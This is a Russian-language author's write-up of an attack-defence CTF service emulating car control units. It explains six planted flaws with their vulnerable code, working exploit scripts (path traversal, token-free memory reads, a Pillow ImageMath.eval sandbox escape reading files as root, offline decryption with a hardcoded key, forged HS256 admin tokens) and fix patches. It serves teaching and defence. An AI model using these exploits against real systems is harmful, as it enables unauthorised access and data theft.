# the_car - как диагностика автомобиля раздаёт данные, которым место внутри ECU

*Авторский технический разбор предусмотренных уязвимостей CTF-сервиса в формате «AD». Python 3.12, FastAPI, asyncio; шесть эмулируемых ECU на внутренней CAN-шине в одном контейнере. Октябрь 2026.*

Автомобиль - это сеть. Шесть блоков управления (двигатель, ABS, автопилот, телеметрия, медиацентр, физика) обмениваются кадрами по общей CAN-шине, а наружу выставлены три точки входа: основной HTTP на 8080, веб-автопилота на 8888 и диагностический CLI на 31337. Диагностический и сервисный доступ удобен владельцу: можно послушать шину, снять дамп региона памяти ABS, выгрузить метаданные маршрута, собрать обложку альбома. Но право пользоваться публичной или сервисной функцией ещё не означает права читать то, что должно оставаться внутри конкретного ECU или принадлежит другому владельцу.

В the_car шесть мест под флаги, по одному на независимую уязвимость в разных ECU: `route_store/<key>` (Place 1), диагностический флаг телеметрии в кадрах `0x7DF` (Place 2), защищённый регион памяти ABS `0x2000..0x4000` (Place 3), приватный ID3-кадр `COMM`, он же `<track>.flag` медиацентра (Place 4), шифрованная запись чёрного ящика (Place 5), `admin_store/<user>` (Place 6). Места 1 и 6 достижимы несколькими путями; ниже для каждого разобран основной, а альтернативы названы отдельно.

| Вектор | Обычная операция | Ошибочное раскрытие |
|---|---|---|
| CAR-1 | Выгрузка метаданных маршрута в `exports` | Секрет чужого маршрута из `route_store` |
| CAR-2 | Просмотр истории шины через `can_sniff` | Чанки диагностического флага из кадров `0x7DF` |
| CAR-3 | Чтение своего региона памяти ABS | Любые 512 байт защищённого региона без токена |
| CAR-4 | Арифметика над обложкой альбома | Содержимое произвольного файла от root |
| CAR-5 | Сырой дамп записи чёрного ящика | Офлайн-расшифровка флага статическим ключом |
| CAR-6 | Сессия автопилота на RS256-токене | Админский секрет по подделанному HS256-токену |

## CAR-1: Экспорт маршрута вышел за пределы каталога выгрузок

Автопилот умеет выгружать метаданные сохранённого маршрута в каталог `exports` и затем отдавать этот файл по его имени. Чтение выгрузки намеренно сделано без авторизации - это публичный «файл на скачивание». Уязвимость появляется, когда имя файла принимается от клиента и приклеивается к каталогу без канонизации: обычным `../` чтение уходит из `exports` в любой соседний каталог хранилища, в том числе в `route_store`, где лежит секрет маршрута.

Атакующему не нужна учётная запись и не нужно подбирать идентификаторы: достаточно узнать из публичной подсказки ключ маршрута-жертвы.

**Хранилище:** № 1 (Place 1) · `route_store/<key>`
**Уязвимый выход:** тело ответа `GET /api/route/export?path=`

### Где именно теряется доступ

`AutopilotStore.read_export` проверяет длину и запрет нулевого байта, но путь собирает как `self.exports / requested_path`. Оператор `/` в `pathlib` не канонизирует результат, поэтому `../route_store/<key>` указывает за пределы каталога выгрузок. Маршрут `GET /api/route/export` при этом не имеет зависимости `current_session`, то есть вызывается вообще без токена - так и задумано для легитимной выгрузки. Ошибка не в отсутствии авторизации, а в том, что область чтения не ограничена каталогом `exports`.

`app/autopilot_web.py:197–204`:

```python
    def read_export(self, requested_path: str) -> Optional[str]:
        if not requested_path or "\x00" in requested_path or len(requested_path) > 512:
            return None
        try:
            candidate = self.exports / requested_path
            return self._read_text(candidate)
        except (OSError, ValueError):
            return None
```

`app/autopilot_web.py:572–580`:

```python
    @app.get("/api/route/export")
    def export_route(path: str) -> PlainTextResponse:
        try:
            value = app.state.store.read_export(path)
        except StorageUnavailable:
            raise HTTPException(status_code=status.HTTP_503_SERVICE_UNAVAILABLE, detail="storage unavailable") from None
        if value is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="export not found")
        return PlainTextResponse(value, media_type="text/plain")
```

### Путь атаки

Публичная подсказка содержит ключ маршрута. Атакующий без авторизации запрашивает `GET /api/route/export?path=../route_store/<key>` и получает секрет из первого хранилища прямо в теле ответа. Тем же приёмом, подставив `../admin_store/<user>`, читается и место 6 - это альтернативный путь к нему.

```
attack data (place 1): <route key>
```

```http
GET /api/route/export?path=../route_store/<key> HTTP/1.1
Host: <host>:8888
```

`sploit/sploit_1.py`:

```python
host, key = args(1)
st, body = http(host, 8888, "GET", "/api/route/export?path=../route_store/" + key)
if st != 200:
    fail("HTTP %s" % st)
emit(body.decode("utf-8", "replace").strip())
```

### Исправление

Патч канонизирует оба пути и проверяет, что результат лежит внутри `exports`. Легитимная выгрузка по имени файла продолжает работать, а любой `../` отсекается ещё до чтения. Маршрут и его публичность не трогаются - ограничивается только область, из которой разрешено читать.

Полный текст эталонного патча:

```diff
diff --git a/app/autopilot_web.py b/app/autopilot_web.py
--- a/app/autopilot_web.py
+++ b/app/autopilot_web.py
@@ -197,10 +197,15 @@
     def read_export(self, requested_path: str) -> Optional[str]:
         if not requested_path or "\x00" in requested_path or len(requested_path) > 512:
             return None
         try:
-            candidate = self.exports / requested_path
+            base = self.exports.resolve()
+            candidate = (base / requested_path).resolve()
+            try:
+                candidate.relative_to(base)
+            except ValueError:
+                return None
             return self._read_text(candidate)
         except (OSError, ValueError):
             return None
```

---

## CAR-2: Диагностический флаг просочился в публичное кольцо истории шины

Телеметрия периодически «вещает» диагностический флаг в кадрах `0x7DF`, разбивая его на чанки (ведущий байт последовательности плюс 7 байт данных). Эти кадры должны быть видны только после диагностической аутентификации `diag_auth`: `can_sniff` без неё читает лишь публичное кольцо `ring`, а диагностические идентификаторы в него попадать не должны. Утечка возникает из-за двух надстроек: шина настроена зеркалировать диагностическую историю в публичное кольцо, а телеметрия вдобавок дублирует каждый кадр в кольцо напрямую.

### Где именно теряется доступ

При публикации кадра `CANBus.publish` кладёт его в приватную историю `_history` всегда, а в публичное кольцо `ring` - только если `mirror_diagnostic_history` истинно либо идентификатор недиагностический. В штатной конфигурации флаг зеркалирования включён, поэтому `0x7DF` оседает в `ring`. Сверх этого `TelemetryECU._publish_diagnostic_frame` вызывает `_record_diagnostic_history`, который ещё раз вписывает кадр в кольцо. Команда `can_sniff` без `diag_auth` читает именно `ring` и выдаёт чанки флага.

**Хранилище:** № 2 (Place 2) · диагностический флаг телеметрии
**Уязвимый выход:** кадры `FRAME 7DF ...` в выдаче `can_sniff`

`app/bus.py:24–27` и `app/bus.py:104–109`:

```python
        mirror_diagnostic_history: bool = True,
```

```python
        frame = CANFrame(int(identifier), bytes(data))
        async with self._lock:
            self._history.append(frame)
            if self.mirror_diagnostic_history or not is_diagnostic_id(frame.id):
                self.ring.append(frame)
```

`app/ecus/telemetry.py:236–238`:

```python
    async def _publish_diagnostic_frame(self, payload: bytes) -> None:
        await self._publish(CAN_ID_DIAGNOSTIC_FLAG, payload, record_in_ring=True)
        await self._record_diagnostic_history(CAN_ID_DIAGNOSTIC_FLAG, payload)
```

`app/bus.py:160–165` (куда смотрит `can_sniff`):

```python
    def sniff(self, n: int = 4096, *, diag_ok: bool = False) -> list[CANFrame]:
        if n < 0:
            raise ValueError("n must not be negative")
        source = self._history if diag_ok else self.ring
        selected = list(source)
        return selected[-n:] if n else []
```

### Путь атаки

Публичная подсказка задаёт базовый номер последовательности и число чанков в виде `base_seq:chunks` (hex). Атакующий подключается к CLI на 31337, несколько раз вызывает `can_sniff` без `diag_auth`, собирает кадры `0x7DF`, раскладывает их по ведущему байту последовательности и склеивает тело флага.

```
attack data (place 2): <base_seq>:<chunks>   # hex, напр. 0a:9
```

```
$ nc <host> 31337
CarHack diagnostic ready
can_sniff 1
FRAME 7DF 0a<7 байт>
FRAME 7DF 0b<7 байт>
...
END
```

`sploit/sploit_2.py`:

```python
host, meta = args(1)
base, count = (int(x, 16) for x in meta.split(":"))
chunks = {}
with CLI(host) as cli:
    for _ in range(8):
        for line in cli.cmd("can_sniff 1", multi=True):
            p = line.split()
            if len(p) == 3 and p[0] == "FRAME" and p[1] == "7DF":
                d = bytes.fromhex(p[2])
                chunks[d[0]] = d[1:]
        if all((base + i) % 256 in chunks for i in range(count)):
            break
emit(b"".join(chunks[(base + i) % 256] for i in range(count)).rstrip(b"\0").decode("utf-8", "replace"))
```

### Исправление

Патч закрывает оба источника: шина по умолчанию больше не зеркалирует диагностическую историю в публичное кольцо, а телеметрия перестаёт дублировать кадр напрямую (`record_in_ring=False`) - метод ручного дублирования и вовсе удалён. Диагностический флаг остаётся в `_history` и доступен только после `diag_auth`; `can_sniff` без неё видит лишь недиагностический трафик.

Полный текст эталонного патча:

```diff
diff --git a/app/bus.py b/app/bus.py
--- a/app/bus.py
+++ b/app/bus.py
@@ -24,7 +24,7 @@
         *,
         ring_size: int = 4096,
         subscriber_queue_size: int = 256,
-        mirror_diagnostic_history: bool = True,
+        mirror_diagnostic_history: bool = False,
     ) -> None:
@@ -114,18 +114,6 @@
                 self._enqueue(queue, frame)
         return frame
 
-    def record_frame(
-        self,
-        identifier: int,
-        data: bytes | bytearray | memoryview = b"",
-    ) -> CANFrame:
-
-        frame = CANFrame(int(identifier), bytes(data))
-        if self.ring and self.ring[-1].id == frame.id and self.ring[-1].data == frame.data:
-            return self.ring[-1]
-        self.ring.append(frame)
-        return frame
-
     def recent(
diff --git a/app/ecus/telemetry.py b/app/ecus/telemetry.py
--- a/app/ecus/telemetry.py
+++ b/app/ecus/telemetry.py
@@ -234,8 +234,7 @@
     async def _publish_diagnostic_frame(self, payload: bytes) -> None:
-        await self._publish(CAN_ID_DIAGNOSTIC_FLAG, payload, record_in_ring=True)
-        await self._record_diagnostic_history(CAN_ID_DIAGNOSTIC_FLAG, payload)
+        await self._publish(CAN_ID_DIAGNOSTIC_FLAG, payload, record_in_ring=False)
@@ -263,18 +256,6 @@
-    async def _record_diagnostic_history(self, can_id: int, payload: bytes) -> None:
-
-        for name in ("record_frame", "mirror_to_sniff_ring", "record_public_frame"):
-            mirror = getattr(self.bus, name, None)
-            if mirror is not None:
-                await _await_if_needed(mirror(can_id, payload))
-                return
-
-        ring = getattr(self.bus, "ring", None)
-        if ring is not None and hasattr(ring, "append"):
-            ring.append((can_id, payload, time.monotonic()))
-
     async def _set_status(self, status: str) -> None:
```

---

## CAR-3: Чтение памяти ABS без токена и за пределами окна

Блок ABS хранит флаг в защищённом регионе памяти `0x2000..0x4000`. Чтение региона привязано к токену: `write_abs`/`store_abs` выдают токен, покрывающий конкретный диапазон, и только он открывает `read_abs`. Но два класс-флага ослабляют проверку: режим совместимости пропускает чтение без токена, а снятое ограничение окна позволяет читать длину, не привязанную к `max_read`. Вместе они дают дамп всего региона без аутентификации.

### Где именно теряется доступ

`LEGACY_READ_COMPAT = True` означает, что при пустом токене проверка привязки полностью пропускается. `BOUNDED_READ_WINDOW = False` означает, что `_read_end` берёт верхней границей всю память, а не `address + max_read`. В `read_abs` условие `if not (self.LEGACY_READ_COMPAT and not token)` при отсутствии токена не выполняется, и чтение идёт сразу из памяти.

**Хранилище:** № 3 (Place 3) · регион ABS `0x2000..0x4000`
**Уязвимый выход:** `DATA <hex>` на команду `read_abs`

`app/ecus/abs.py:62–64`:

```python
    name = "abs"
    LEGACY_READ_COMPAT = True
    BOUNDED_READ_WINDOW = False
```

`app/ecus/abs.py:217–234`:

```python
    def _read_end(self, address: int, length: int) -> int:
        ...
        if self.BOUNDED_READ_WINDOW and address < self.flag_region_base:
            raise ABSRangeError("ABS reads must stay in the protected flag region")
        limit = self.max_read if self.BOUNDED_READ_WINDOW else self.memory_size
        return min(address + length, address + limit, self.memory_size)
```

```python
        end = self._read_end(address, requested)
        token = "" if wtok is None else str(wtok).strip()

        async with self._lock:
            self._expire_records()
            if not (self.LEGACY_READ_COMPAT and not token):
                if not any(binding.covers(address, end, token) for binding in reversed(self._bindings)):
                    raise ABSAccessError("invalid ABS read token")
            result = bytes(self.mem[address:end])
```

### Путь атаки

Публичная подсказка - hex-адрес записи во флаговом регионе. Атакующий подключается к CLI и вызывает `read_abs <addr> 200` без третьего аргумента-токена. Проверка привязки пропускается, окно не ограничивает длину, и 512 байт региона возвращаются как `DATA`.

```
attack data (place 3): <hex-адрес>
```

```
$ nc <host> 31337
CarHack diagnostic ready
read_abs <addr> 200
DATA <hex>
```

`sploit/sploit_3.py`:

```python
host, addr = args(1)
with CLI(host) as cli:
    reply = cli.cmd("read_abs %s 200" % addr)[0]
if not reply.startswith("DATA"):
    fail(reply)
emit(bytes.fromhex(reply.split()[1]).split(b"\0")[0].decode("utf-8", "replace"))
```

### Исправление

Патч переключает оба флага и делает проверку токена обязательной: пустой токен теперь приводит к ошибке доступа, а окно чтения всегда ограничено `max_read`. Законный владелец по-прежнему читает свой диапазон по выданному токену, но анонимный дамп региона становится невозможен.

Полный текст эталонного патча:

```diff
diff --git a/app/ecus/abs.py b/app/ecus/abs.py
--- a/app/ecus/abs.py
+++ b/app/ecus/abs.py
@@ -62,8 +62,8 @@
     name = "abs"
-    LEGACY_READ_COMPAT = True
-    BOUNDED_READ_WINDOW = False
+    LEGACY_READ_COMPAT = False
+    BOUNDED_READ_WINDOW = True
@@ -133,8 +133,7 @@
         if self.BOUNDED_READ_WINDOW and address < self.flag_region_base:
             raise ABSRangeError("ABS reads must stay in the protected flag region")
-        limit = self.max_read if self.BOUNDED_READ_WINDOW else self.memory_size
-        return min(address + length, address + limit, self.memory_size)
+        return min(address + length, address + self.max_read, self.memory_size)
@@ -224,12 +223,13 @@
         end = self._read_end(address, requested)
         token = "" if wtok is None else str(wtok).strip()
+        if not token:
+            raise ABSAccessError("ABS read token is required")
 
         async with self._lock:
             self._expire_records()
-            if not (self.LEGACY_READ_COMPAT and not token):
-                if not any(binding.covers(address, end, token) for binding in reversed(self._bindings)):
-                    raise ABSAccessError("invalid ABS read token")
+            if not any(binding.covers(address, end, token) for binding in reversed(self._bindings)):
+                raise ABSAccessError("invalid ABS read token")
             result = bytes(self.mem[address:end])
```

---

## CAR-4: Арифметика над обложкой альбома превратилась в чтение файлов от root

Медиацентр даёт законную функцию: выполнить арифметическое выражение над картинкой-обложкой через `PIL.ImageMath.eval`. Проблема в самом `ImageMath.eval`: он исполняет выражение как Python-код в окружении, которое передаёт клиент. На Pillow 10.1.0 это CVE-2023-50447, а приватный `COMM`-флаг медиацентра лежит отдельным файлом `<track>.flag`, читаемым процессом от root.

Голый PoC из CVE не срабатывает: `scan()` требует, чтобы каждое имя из выражения присутствовало в окружении. Обход - объявить нужные дандеры ключами `values`, тогда проверка имён проходит, а выражение всё равно добирается до `__globals__` и встроенных функций.

**Хранилище:** № 4 (Place 4) · `<track>.flag` медиацентра
**Уязвимый выход:** поле `mode` в ответе `/api/media/albumart`

### Где именно теряется доступ

`evaluate_album_art` передаёт пользовательское выражение и весь словарь `values` прямо в `ImageMath.eval`, без фильтрации выражения и без ограничения имён. Обработчик `/api/media/albumart` принимает `values` от клиента как есть. Этого достаточно для выполнения произвольного Python-кода внутри процесса, идущего от root.

`app/ecus/infotainment.py:351–355`:

```python
def evaluate_album_art(expression: str, environment: Mapping[str, Any]) -> Any:

    from PIL import ImageMath

    return ImageMath.eval(expression, **dict(environment))
```

`app/api.py:176–185`:

```python
    @app.post("/api/media/albumart")
    async def album_art(payload: dict[str, Any]) -> dict[str, object]:
        image = _decode_b64(payload.get("image_b64"), label="image_b64")
        values = payload.get("values", {})
        try:
            return await _maybe_await(runtime.infotainment.evaluate_album_art(image, values))
        except AttributeError as exc:
            raise _json_error(501, "album-art handler unavailable") from exc
        except Exception as exc:
            raise _json_error(422, "album-art rejected") from exc
```

### Путь атаки

Публичная подсказка - `track_id`. Эталонный сплойт не пишет в чужой бокс и не запускает `system`: выражение строит объект, чей атрибут `mode` равен содержимому флагового файла, а обработчик album-art сам возвращает `mode` в ответе. Дандеры-ключи в `values` проводят выражение через проверку имён `scan()`.

```
attack data (place 4): <track_id>
```

```http
POST /api/media/albumart HTTP/1.1
Host: <host>:8080
Content-Type: application/json

{"image_b64":"<1x1 PNG>","values":{"expression":"...","fp":"/app/stores/infotainment/<track>.flag","__class__":0,...}}
```

`sploit/sploit_4.py`:

```python
B = "a.__class__.__init__.__globals__['__builtins__']"
expr = "%s['type'](nm, (), {'mode': %s['open'](fp).read()})()" % (B, B)
values = {"expression": expr, "nm": "X", "fp": "/app/stores/infotainment/%s.flag" % track,
          "__class__": 0, "__init__": 0, "__globals__": 0, "type": 0, "open": 0, "read": 0}

st, body = http(host, 8080, "POST", "/api/media/albumart", {"image_b64": PNG, "values": values})
if st != 200:
    fail("album-art отклонил payload, HTTP %s" % st)
emit(json.loads(body)["mode"].strip())
```

Рядом с этим вектором в медиацентре есть ещё два пути к тому же боксу: `tarfile.extractall` без `filter` в `/api/media/pack` (CVE-2007-4559, запись в произвольный путь от root) и `strcpy` в буфер `char[64]` в `native/id3parse`, собранном с `-fno-stack-protector` (канарейки нет; PIE и NX на месте, нужен обход ASLR - проверен только SIGSEGV).

### Исправление

Патч добавляет жёсткий фильтр: выражение должно соответствовать узкому набору символов, а имена в `values` и в самом выражении - принадлежать белому списку изображений (`a`, `b`, `mask`, `img`). Законная арифметика над обложкой остаётся доступной, но до `__globals__` и встроенных функций выражение больше не доберётся. Заодно `extractall` получает `filter="data"`, а библиотеки подняты до Pillow 10.2.0 / PyYAML 6.0.1 / PyJWT 2.8.0, и нативный парсер пересобран с полным набором митигаций.

Полный текст эталонного патча:

```diff
diff --git a/app/ecus/infotainment.py b/app/ecus/infotainment.py
--- a/app/ecus/infotainment.py
+++ b/app/ecus/infotainment.py
@@ -17,6 +18,9 @@
 _MAX_MEDIA_BYTES = 4 * 1024 * 1024
 _ID3_FRAME_NAMES = {"TIT2": "TITLE", "TPE1": "ARTIST", "COMM": "COMM"}
+_SAFE_ALBUM_NAMES = frozenset({"a", "b", "mask", "img"})
+_ALBUM_IDENTIFIER = re.compile(r"[A-Za-z_][A-Za-z0-9_]*")
+_ALBUM_EXPRESSION = re.compile(r"^[A-Za-z0-9_+\-*/%()., <>!=&|~]+$")
@@ -350,9 +349,18 @@
 def evaluate_album_art(expression: str, environment: Mapping[str, Any]) -> Any:
 
+    if not isinstance(expression, str) or not _ALBUM_EXPRESSION.fullmatch(expression):
+        raise MediaFormatError("unsupported album-art expression")
+    supplied = dict(environment)
+    if not supplied or not set(supplied).issubset(_SAFE_ALBUM_NAMES):
+        raise MediaFormatError("unsupported album-art variable")
+    identifiers = set(_ALBUM_IDENTIFIER.findall(expression))
+    if not identifiers.issubset(set(supplied) | {"True", "False"}):
+        raise MediaFormatError("album-art expression names must be supplied images")
+
     from PIL import ImageMath
 
-    return ImageMath.eval(expression, **dict(environment))
+    return ImageMath.eval(expression, **supplied)
@@ -360,4 +368,4 @@
     with tarfile.open(fileobj=io.BytesIO(archive_bytes), mode="r:*") as archive:
-        archive.extractall(target)
+        archive.extractall(target, filter="data")
```

---

## CAR-5: Статический ключ чёрного ящика и публичный сырой дамп

Чёрный ящик шифрует флаг по AES-GCM и выдаёт расшифровку только владельцу через `/api/blackbox/get`. При этом есть сервисный маршрут `/api/blackbox/raw/{id}`, который отдаёт `nonce+ciphertext` в base64 вообще без авторизации - он нужен чекеру и проверяется каждый раунд, так что убрать его нельзя. Сам по себе сырой шифртекст безопасен ровно до тех пор, пока ключ секретный. Но ключ в сервисе зашит константой, одинаковой во всех образах.

### Где именно теряется доступ

`DEFAULT_TELE_KEY` - фиксированная 32-байтовая строка, и при пустом `telemetry_key` именно она становится ключом AES-GCM. AAD тоже константа. `get_blackbox_raw` отдаёт запись без проверки владельца. Зная константу-ключ, AAD и сырой блоб, атакующий расшифровывает флаг офлайн - сервер для этого больше не нужен.

**Хранилище:** № 5 (Place 5) · запись чёрного ящика
**Уязвимый выход:** `ct_b64` в ответе `/api/blackbox/raw/{id}`

`app/ecus/telemetry.py:28` и `app/ecus/telemetry.py:70`:

```python
DEFAULT_TELE_KEY = b"CarHack-telemetry-aes-key-v1-32b"
```

```python
        key = DEFAULT_TELE_KEY if telemetry_key is None else bytes(telemetry_key)
```

`app/ecus/telemetry.py:174–181`:

```python
    async def get_blackbox_raw(self, record_id: str) -> str | None:

        async with self._lock:
            record = self._records.get("blackbox", record_id)
        if record is None:
            return None
        return base64.b64encode(record.data).decode("ascii")
```

### Путь атаки

Публичная подсказка - `record_id`. Атакующий без авторизации читает `/api/blackbox/raw/{id}`, отделяет первые 12 байт (nonce) от шифртекста и расшифровывает статическим ключом с известным AAD.

```
attack data (place 5): <record_id>
```

```http
GET /api/blackbox/raw/<record_id> HTTP/1.1
Host: <host>:8080
```

`sploit/sploit_5.py`:

```python
KEY = b"CarHack-telemetry-aes-key-v1-32b"
AAD = b"carhack:blackbox:v1"

st, body = http(host, 8080, "GET", "/api/blackbox/raw/" + record)
blob = base64.b64decode(json.loads(body)["ct_b64"])
emit(AESGCM(KEY).decrypt(blob[:12], blob[12:], AAD).decode("utf-8"))
```

### Исправление

Патч убирает зашитую константу и выводит ключ из переменной окружения `TELE_KEY`, своей у каждого развёртывания (`sha256` от значения). Сырой маршрут остаётся - его проверяет чекер, - но теперь сырой шифртекст бесполезен без секрета конкретного образа, и офлайн-расшифровка известным ключом отваливается.

Полный текст эталонного патча:

```diff
diff --git a/app/ecus/telemetry.py b/app/ecus/telemetry.py
--- a/app/ecus/telemetry.py
+++ b/app/ecus/telemetry.py
@@ -28,1 +28,0 @@
-DEFAULT_TELE_KEY = b"CarHack-telemetry-aes-key-v1-32b"
@@ -50,0 +50,8 @@
+def _key_from_environment() -> bytes:
+
+    configured = os.environ.get("TELE_KEY")
+    if not configured:
+        raise TelemetryError("TELE_KEY must be set in the patched service")
+    return hashlib.sha256(configured.encode("utf-8")).digest()
+
@@ -70,1 +77,1 @@
-        key = DEFAULT_TELE_KEY if telemetry_key is None else bytes(telemetry_key)
+        key = _key_from_environment() if telemetry_key is None else bytes(telemetry_key)
```

---

## CAR-6: Секрет сервисных токенов выведен из публичного ключа

Автопилот выдаёт сессии как RS256-токены, подписанные приватным ключом, и публикует публичный ключ в `/api/jwks`. Кроме RS256 `decode()` принимает ещё и «сервисные» HS256-токены по симметричному секрету. Беда в том, как этот секрет получается: он равен `sha256(метка + публичный ключ в DER)`, то есть целиком вычисляется из того, что сервис сам раздаёт в `/api/jwks`. Симметричный секрет перестаёт быть секретом.

### Где именно теряется доступ

`RSAKeyManager` считает `_service_secret` из публичного DER. В `decode()` алгоритм токена читается из незаверенного заголовка, и при `alg=HS256` токен проверяется этим «секретом». Поскольку DER восстанавливается из `n` и `e` в JWKS, атакующий воспроизводит секрет, подписывает HS256-токен с `role=admin` и нужным `sub`, и проходит под админом.

**Хранилище:** № 6 (Place 6) · `admin_store/<user>`
**Уязвимый выход:** поле `secret` в ответе `/api/adminsecret`

`app/autopilot_web.py:33–34` и `app/autopilot_web.py:392`:

```python
SERVICE_TOKEN_ALGORITHM = "HS256"
SERVICE_SECRET_LABEL = b"carhack-autopilot/service-token/v1"
```

```python
        self._service_secret = hashlib.sha256(SERVICE_SECRET_LABEL + self._public_der).digest()
```

`app/autopilot_web.py:414–431`:

```python
    def decode(self, token: str) -> Session:
        try:
            algorithm = jwt.get_unverified_header(token).get("alg")
            if algorithm == SERVICE_TOKEN_ALGORITHM:
                claims = jwt.decode(
                    token,
                    self._service_secret,
                    algorithms=[SERVICE_TOKEN_ALGORITHM],
                    issuer=JWT_ISSUER,
                    options={"require": ["exp", "sub", "role", "iss"]},
                )
            else:
                claims = jwt.decode(
                    token,
                    self._public_pem,
                    algorithms=["RS256"],
                    ...
                )
```

### Путь атаки

Публичная подсказка - логин, под которым хранится админский секрет. Атакующий берёт `n` и `e` из `/api/jwks`, собирает DER публичного ключа, выводит секрет как `sha256(метка + DER)`, подписывает HS256-токен с `role=admin` и `sub=<логин>` и читает `/api/adminsecret`. Доменная метка обязательна - без неё HMAC не сойдётся.

```
attack data (place 6): <логин>
```

```http
GET /api/adminsecret HTTP/1.1
Host: <host>:8888
Authorization: Bearer <подделанный HS256-токен>
```

`sploit/sploit_6.py`:

```python
jwk = json.loads(body)["keys"][0]
der = rsa.RSAPublicNumbers(
    int.from_bytes(unb64(jwk["e"]), "big"), int.from_bytes(unb64(jwk["n"]), "big")
).public_key().public_bytes(serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo)
secret = hashlib.sha256(b"carhack-autopilot/service-token/v1" + der).digest()
...
claims = b64(json.dumps({"iss": "carhack-autopilot", "sub": user, "role": "admin",
                         "iat": now, "exp": now + 3600, "jti": b64(now.to_bytes(8, "big"))}, ...).encode())
sig = b64(hmac.new(secret, ("%s.%s" % (head, claims)).encode(), hashlib.sha256).digest())
```

### Исправление

Патч убирает сервисные HS256-токены целиком: исчезают метка, вычисление `_service_secret` и ветка `alg=HS256` в `decode()`. Остаётся только RS256, который проверяется приватно подписанным, а не выводимым из публичного ключа секретом. Рядом в `/api/mission` опасный `yaml.load(Loader=yaml.Loader)` (RCE через `!!python/object/apply` на PyYAML 5.3.1) заменён на `yaml.safe_load` - это альтернативный путь к тому же боксу.

Полный текст эталонного патча:

```diff
diff --git a/app/autopilot_web.py b/app/autopilot_web.py
--- a/app/autopilot_web.py
+++ b/app/autopilot_web.py
@@ -30,8 +30,6 @@
 JWT_ISSUER = "carhack-autopilot"
-SERVICE_TOKEN_ALGORITHM = "HS256"
-SERVICE_SECRET_LABEL = b"carhack-autopilot/service-token/v1"
 JWT_LIFETIME_SECONDS = 15 * 60
@@ -389,7 +392,6 @@
         self.kid = _b64url(digest.finalize()[:12])
-        self._service_secret = hashlib.sha256(SERVICE_SECRET_LABEL + self._public_der).digest()
@@ -412,23 +414,13 @@
     def decode(self, token: str) -> Session:
         try:
-            algorithm = jwt.get_unverified_header(token).get("alg")
-            if algorithm == SERVICE_TOKEN_ALGORITHM:
-                claims = jwt.decode(
-                    token,
-                    self._service_secret,
-                    algorithms=[SERVICE_TOKEN_ALGORITHM],
-                    issuer=JWT_ISSUER,
-                    options={"require": ["exp", "sub", "role", "iss"]},
-                )
-            else:
-                claims = jwt.decode(
-                    token,
-                    self._public_pem,
-                    algorithms=["RS256"],
-                    issuer=JWT_ISSUER,
-                    options={"require": ["exp", "sub", "role", "iss"]},
-                )
+            claims = jwt.decode(
+                token,
+                self._public_pem,
+                algorithms=["RS256"],
+                issuer=JWT_ISSUER,
+                options={"require": ["exp", "sub", "role", "iss"]},
+            )
         except (jwt.PyJWTError, TypeError, ValueError):
@@ -639,7 +631,7 @@
             text = body.decode("utf-8")
-            yaml.load(text, Loader=yaml.Loader)
+            yaml.safe_load(text)
```

---

## Что объединяет эти шесть уязвимостей

В каждом случае сама операция законна, но она открывает доступ к данным, у которых другой владелец или другое место хранения. Экспорт маршрута нужно удерживать в каталоге выгрузок, диагностический флаг - показывать только после `diag_auth`, чтение памяти ABS - привязывать к токену и окну, арифметику над обложкой - ограничивать именами изображений, сырой дамп чёрного ящика безопасен лишь при секретном ключе, а сессии автопилота должны проверяться подписью, которую нельзя вывести из публичного ключа.

Места 1 и 6 стоит рассматривать вместе: к обоим ведёт не только «профильный» вектор, но и общий path traversal в `/api/route/export`, а к боксу автопилота - ещё и `yaml.load` в `/api/mission`. CAR-4 показывает отдельную опасность: там, где клиент управляет окружением `eval`-подобной функции, фильтровать нужно и выражение, и имена, иначе проверка присутствия имён легко обходится объявлением дандеров. А CAR-5 напоминает, что «публичный сырой вывод» - это не уязвимость сам по себе; уязвимостью его делает статический секрет, одинаковый во всех образах.

За пределами шести флагов остаётся атака на доступность: `PEDAL_SENSOR_AUTHORITY` позволяет кадром датчика педали `0x101` перебить команду тяги, а неаутентифицированный `can_send` на 31337 - намертво обнулить скорость. Патч выключает авторитет педального датчика, но закрывать лишние control-ID на CLI командам придётся самим: чекеру нужен только `can_send 201 01`.
